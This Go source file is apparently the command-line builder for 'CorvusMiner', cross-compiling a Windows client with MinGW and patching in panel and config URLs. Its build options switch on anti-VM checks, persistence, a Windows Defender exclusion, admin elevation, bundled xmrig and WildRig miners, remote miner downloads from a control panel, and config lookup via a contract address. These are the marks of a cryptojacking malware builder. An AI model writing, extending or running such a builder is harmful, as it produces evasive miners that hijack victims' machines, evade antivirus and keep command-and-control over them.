package main

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

// Result is the machine-readable outcome of a build, emitted with -json.
type Result struct {
	Success    bool           `json:"success"`
	Output     string         `json:"output,omitempty"`
	Bytes      int64          `json:"bytes,omitempty"`
	SHA256     string         `json:"sha256,omitempty"`
	DurationMS int64          `json:"duration_ms"`
	BuildDir   string         `json:"build_dir,omitempty"`
	Config     map[string]any `json:"config,omitempty"`
	Warnings   []string       `json:"warnings,omitempty"`
	Error      string         `json:"error,omitempty"`
}

type builder struct {
	cfg       BuildConfig
	root      string
	clientDir string
	log       *logger
}

type buildPlan struct {
	stageDir  string
	clientDir string
	buildDir  string
	toolchain string
	configure []string
	build     []string
	artifact  string
	embedded  string
}

// Run executes the whole pipeline: preflight, stage, patch, configure, build,
// publish.
func (b *builder) Run(ctx context.Context) (res Result, err error) {
	start := time.Now()
	res.Config = b.cfg.Summary()
	defer func() {
		res.DurationMS = time.Since(start).Milliseconds()
		if err != nil {
			res.Success = false
			res.Error = err.Error()
		}
	}()

	warnings, err := b.preflight()
	if err != nil {
		return res, err
	}
	for _, w := range warnings {
		b.log.Warnf("%s", w)
	}
	res.Warnings = warnings

	if b.cfg.DryRun {
		plan, planErr := b.plan("<stage>")
		if planErr != nil {
			return res, planErr
		}
		res.Config["embedded_config"] = plan.embedded
		b.log.Infof("Dry run - nothing was built")
		b.log.Infof("Staging directory: %s", plan.stageDir)
		b.log.Infof("Configure: %s", shellJoin(append([]string{"cmake"}, plan.configure...)))
		b.log.Infof("Build:     %s", shellJoin(append([]string{"cmake"}, plan.build...)))
		b.log.Infof("Artifact:  %s", filepath.Join(b.cfg.Output, b.cfg.Name))
		res.Success = true
		return res, nil
	}

	stageDir, err := os.MkdirTemp("", "corvus-build-*")
	if err != nil {
		return res, fmt.Errorf("create staging dir: %w", err)
	}
	if b.cfg.KeepBuild {
		res.BuildDir = stageDir
		b.log.Infof("Staging directory (kept): %s", stageDir)
	} else {
		defer os.RemoveAll(stageDir)
		b.log.Infof("Staging directory: %s", stageDir)
	}

	b.log.Infof("Copying client sources")
	if err := stageClient(b.clientDir, filepath.Join(stageDir, "Client")); err != nil {
		return res, fmt.Errorf("stage sources: %w", err)
	}

	patchedMain := filepath.Join(stageDir, "Client", "src", "main.cpp")
	if err := patchMainCpp(patchedMain, b.cfg.PanelURLs, b.cfg.ConfigURLs); err != nil {
		return res, fmt.Errorf("patch main.cpp: %w", err)
	}
	if urls := splitTrimmed(b.cfg.PanelURLs); len(urls) > 0 {
		b.log.Infof("Panel URL(s): %s", strings.Join(urls, ", "))
	}
	if urls := splitTrimmed(b.cfg.ConfigURLs); len(urls) > 0 {
		b.log.Infof("Config GET URL(s): %s", strings.Join(urls, ", "))
	}

	plan, err := b.plan(stageDir)
	if err != nil {
		return res, err
	}
	res.Config["embedded_config"] = plan.embedded
	if b.cfg.Toolchain == "" {
		if err := writeToolchain(plan.toolchain); err != nil {
			return res, fmt.Errorf("write toolchain file: %w", err)
		}
	}

	if err := b.runCmd(ctx, "cmake", plan.configure); err != nil {
		return res, err
	}
	if err := b.runCmd(ctx, "cmake", plan.build); err != nil {
		return res, err
	}

	out, size, sum, err := publish(plan.artifact, b.cfg.Output, b.cfg.Name)
	if err != nil {
		return res, err
	}
	res.Output, res.Bytes, res.SHA256, res.Success = out, size, sum, true
	return res, nil
}

func (b *builder) preflight() ([]string, error) {
	var warnings []string

	if b.cfg.Toolchain != "" {
		if info, err := os.Stat(b.cfg.Toolchain); err != nil || info.IsDir() {
			return nil, fmt.Errorf("toolchain file not found: %s", b.cfg.Toolchain)
		}
	} else {
		var missing []string
		for _, tool := range []string{"cmake", "x86_64-w64-mingw32-gcc", "x86_64-w64-mingw32-g++", "x86_64-w64-mingw32-windres"} {
			if _, err := exec.LookPath(tool); err != nil {
				missing = append(missing, tool)
			}
		}
		if len(missing) > 0 {
			return nil, fmt.Errorf("missing required tool(s): %s (install with: sudo apt install cmake mingw-w64)", strings.Join(missing, ", "))
		}
	}

	if b.cfg.CPUMiner {
		if err := requireFile(filepath.Join(b.clientDir, "resources", "xmrig.exe"), "CPU miner"); err != nil {
			return nil, err
		}
	}
	if b.cfg.GPUMiner {
		if err := requireFile(filepath.Join(b.clientDir, "resources", "wildrig.exe"), "GPU miner (WildRig)"); err != nil {
			return nil, err
		}
	}

	if b.cfg.Monitoring {
		warnings = append(warnings, "process monitoring is applied from panel config at runtime; -monitoring has no compile-time effect")
	}
	if b.cfg.RemoteMiners && len(splitTrimmed(b.cfg.PanelURLs)) == 0 {
		warnings = append(warnings, "remote miners download from the panel, but no -panel-urls were supplied")
	}
	for _, u := range splitTrimmed(b.cfg.PanelURLs) {
		if !strings.Contains(u, "/api/miners/submit") {
			warnings = append(warnings, fmt.Sprintf("panel URL %q does not contain /api/miners/submit", u))
		}
	}
	return warnings, nil
}

func (b *builder) plan(stageDir string) (*buildPlan, error) {
	clientDir := filepath.Join(stageDir, "Client")
	buildDir := filepath.Join(stageDir, "build")

	toolchain := b.cfg.Toolchain
	if toolchain == "" {
		toolchain = filepath.Join(stageDir, "mingw-toolchain.cmake")
	}

	configure := []string{
		"-S", clientDir,
		"-B", buildDir,
		"-DCMAKE_TOOLCHAIN_FILE=" + toolchain,
		"-DCMAKE_BUILD_TYPE=Release",
		"-DENABLE_ANTIVM=" + onOff(b.cfg.AntiVM),
		"-DENABLE_PERSISTENCE=" + onOff(b.cfg.Persistence),
		"-DENABLE_DEBUG_CONSOLE=" + onOff(b.cfg.DebugConsole),
		"-DENABLE_ADMIN_MANIFEST=" + onOff(b.cfg.AdminManifest),
		"-DENABLE_DEFENDER_EXCLUSION=" + onOff(b.cfg.DefenderExclusion),
		"-DENABLE_REMOTE_MINERS=" + onOff(b.cfg.RemoteMiners),
		"-DENABLE_CPU_MINER=" + onOff(b.cfg.CPUMiner),
		"-DENABLE_GPU_MINER=" + onOff(b.cfg.GPUMiner),
	}

	if urls := strings.Join(splitTrimmed(b.cfg.ConfigURLs), ","); urls != "" {
		configure = append(configure, "-DCONFIG_GET_URL="+urls)
	}
	if b.cfg.ContractAddress != "" {
		configure = append(configure,
			"-DENABLE_CONTRACT_URL=ON",
			"-DCONTRACT_ADDRESS="+b.cfg.ContractAddress,
		)
	} else {
		configure = append(configure, "-DENABLE_CONTRACT_URL=OFF")
	}

	embeddedPath, embedded, err := b.resolveEmbeddedConfig()
	if err != nil {
		return nil, err
	}
	if embedded {
		b.log.Infof("Embedded fallback config: %s", embeddedPath)
		configure = append(configure,
			"-DENABLE_EMBEDDED_CONFIG=ON",
			"-DEMBEDDED_CONFIG_JSON_INPUT="+embeddedPath,
		)
	} else {
		// A path that cannot exist keeps CMake's auto-detection of
		// Client/resources/embedded_config.json disabled.
		configure = append(configure,
			"-DENABLE_EMBEDDED_CONFIG=OFF",
			"-DEMBEDDED_CONFIG_JSON_INPUT="+filepath.Join(stageDir, ".no-embedded-config.json"),
		)
	}

	return &buildPlan{
		stageDir:  stageDir,
		clientDir: clientDir,
		buildDir:  buildDir,
		toolchain: toolchain,
		configure: configure,
		build:     []string{"--build", buildDir, "--parallel", strconv.Itoa(b.cfg.Jobs)},
		artifact:  filepath.Join(buildDir, "corvus.exe"),
		embedded:  embeddedName(embeddedPath, embedded),
	}, nil
}

// resolveEmbeddedConfig returns the JSON file to embed, if any.
func (b *builder) resolveEmbeddedConfig() (string, bool, error) {
	switch b.cfg.EmbeddedConfig {
	case "none":
		return "", false, nil
	case "auto":
		for _, candidate := range b.autoConfigCandidates() {
			if info, err := os.Stat(candidate); err == nil && !info.IsDir() {
				if err := requireJSON(candidate); err != nil {
					return "", false, err
				}
				return candidate, true, nil
			}
		}
		return "", false, nil
	default:
		if err := requireJSON(b.cfg.EmbeddedConfig); err != nil {
			return "", false, err
		}
		return b.cfg.EmbeddedConfig, true, nil
	}
}

func (b *builder) autoConfigCandidates() []string {
	parent := filepath.Dir(b.root)
	return []string{
		filepath.Join(b.root, "embedded_config.json"),
		filepath.Join(b.clientDir, "resources", "embedded_config.json"),
		filepath.Join(parent, "embedded_config.json"),
	}
}

func (b *builder) runCmd(ctx context.Context, name string, args []string) error {
	b.log.Infof("Running: %s", shellJoin(append([]string{name}, args...)))
	tail := &tailBuffer{max: 8 << 10}
	cmd := exec.CommandContext(ctx, name, args...)
	cmd.Stdout = io.MultiWriter(b.log.writer(), tail)
	cmd.Stderr = io.MultiWriter(b.log.writer(), tail)

	if err := cmd.Run(); err != nil {
		if ctxErr := ctx.Err(); ctxErr != nil {
			return fmt.Errorf("%s stopped: %w", name, ctxErr)
		}
		if out := strings.TrimSpace(tail.String()); out != "" {
			return fmt.Errorf("%s failed: %w\n--- last output ---\n%s", name, err, out)
		}
		return fmt.Errorf("%s failed: %w", name, err)
	}
	return nil
}

func (l *logger) writer() io.Writer { return l.w }

func writeToolchain(path string) error {
	var sb strings.Builder
	sb.WriteString("# Generated by the CorvusMiner Linux CLI builder.\n")
	sb.WriteString("set(CMAKE_SYSTEM_NAME Windows)\n")
	sb.WriteString("set(CMAKE_SYSTEM_PROCESSOR x86_64)\n")
	sb.WriteString("set(CMAKE_C_COMPILER x86_64-w64-mingw32-gcc)\n")
	sb.WriteString("set(CMAKE_CXX_COMPILER x86_64-w64-mingw32-g++)\n")
	sb.WriteString("set(CMAKE_RC_COMPILER x86_64-w64-mingw32-windres)\n")
	if root := mingwSysroot(); root != "" {
		fmt.Fprintf(&sb, "set(CMAKE_FIND_ROOT_PATH %s)\n", root)
		sb.WriteString("set(CMAKE_FIND_ROOT_PATH_MODE_PROGRAM NEVER)\n")
		sb.WriteString("set(CMAKE_FIND_ROOT_PATH_MODE_LIBRARY ONLY)\n")
		sb.WriteString("set(CMAKE_FIND_ROOT_PATH_MODE_INCLUDE ONLY)\n")
	}
	return os.WriteFile(path, []byte(sb.String()), 0o644)
}

// mingwSysroot locates the MinGW-w64 target tree so CMake searches the cross
// toolchain for libraries instead of the host.
func mingwSysroot() string {
	if env := os.Getenv("MINGW_SYSROOT"); env != "" {
		return env
	}
	if gcc, err := exec.LookPath("x86_64-w64-mingw32-gcc"); err == nil {
		candidate := filepath.Clean(filepath.Join(filepath.Dir(gcc), "..", "x86_64-w64-mingw32"))
		if info, err := os.Stat(candidate); err == nil && info.IsDir() {
			return candidate
		}
	}
	for _, candidate := range []string{
		"/usr/x86_64-w64-mingw32",
		"/usr/local/x86_64-w64-mingw32",
		"/opt/x86_64-w64-mingw32",
	} {
		if info, err := os.Stat(candidate); err == nil && info.IsDir() {
			return candidate
		}
	}
	return ""
}

// publish copies the artifact into outDir atomically and reports its size/hash.
func publish(src, outDir, name string) (string, int64, string, error) {
	info, err := os.Stat(src)
	if err != nil || info.IsDir() {
		return "", 0, "", fmt.Errorf("build artifact not found at %s", src)
	}
	if err := os.MkdirAll(outDir, 0o755); err != nil {
		return "", 0, "", fmt.Errorf("create output dir: %w", err)
	}

	tmp, err := os.CreateTemp(outDir, "."+name+".tmp-*")
	if err != nil {
		return "", 0, "", fmt.Errorf("create output file: %w", err)
	}
	tmpName := tmp.Name()
	discard := func() {
		tmp.Close()
		os.Remove(tmpName)
	}

	in, err := os.Open(src)
	if err != nil {
		discard()
		return "", 0, "", err
	}
	defer in.Close()

	hash := sha256.New()
	size, err := io.Copy(io.MultiWriter(tmp, hash), in)
	if err != nil {
		discard()
		return "", 0, "", fmt.Errorf("copy artifact: %w", err)
	}
	if err := tmp.Sync(); err != nil {
		discard()
		return "", 0, "", err
	}
	if err := tmp.Close(); err != nil {
		os.Remove(tmpName)
		return "", 0, "", err
	}
	if err := os.Chmod(tmpName, 0o755); err != nil {
		os.Remove(tmpName)
		return "", 0, "", err
	}

	dst := filepath.Join(outDir, name)
	if err := os.Rename(tmpName, dst); err != nil {
		os.Remove(tmpName)
		return "", 0, "", err
	}
	abs, err := filepath.Abs(dst)
	if err != nil {
		abs = dst
	}
	return abs, size, hex.EncodeToString(hash.Sum(nil)), nil
}

func embeddedName(path string, embedded bool) string {
	if !embedded {
		return "none"
	}
	return path
}

func requireFile(path, label string) error {
	info, err := os.Stat(path)
	if err != nil {
		return fmt.Errorf("%s resource not found: %s", label, path)
	}
	if info.IsDir() {
		return fmt.Errorf("%s resource is a directory: %s", label, path)
	}
	return nil
}

func requireJSON(path string) error {
	data, err := os.ReadFile(path)
	if err != nil {
		return fmt.Errorf("embedded config: %w", err)
	}
	if !json.Valid(data) {
		return fmt.Errorf("embedded config is not valid JSON: %s", path)
	}
	return nil
}

func onOff(v bool) string {
	if v {
		return "ON"
	}
	return "OFF"
}

func shellJoin(args []string) string {
	quoted := make([]string, len(args))
	for i, arg := range args {
		if arg == "" || strings.ContainsAny(arg, " \t\"'\\$") {
			quoted[i] = strconv.Quote(arg)
		} else {
			quoted[i] = arg
		}
	}
	return strings.Join(quoted, " ")
}

// tailBuffer keeps the last max bytes written, so failures can report the tail
// of the compiler output without buffering the entire build log.
type tailBuffer struct {
	buf []byte
	max int
}

func (t *tailBuffer) Write(p []byte) (int, error) {
	t.buf = append(t.buf, p...)
	if len(t.buf) > t.max {
		t.buf = t.buf[len(t.buf)-t.max:]
	}
	return len(p), nil
}

func (t *tailBuffer) String() string { return string(t.buf) }
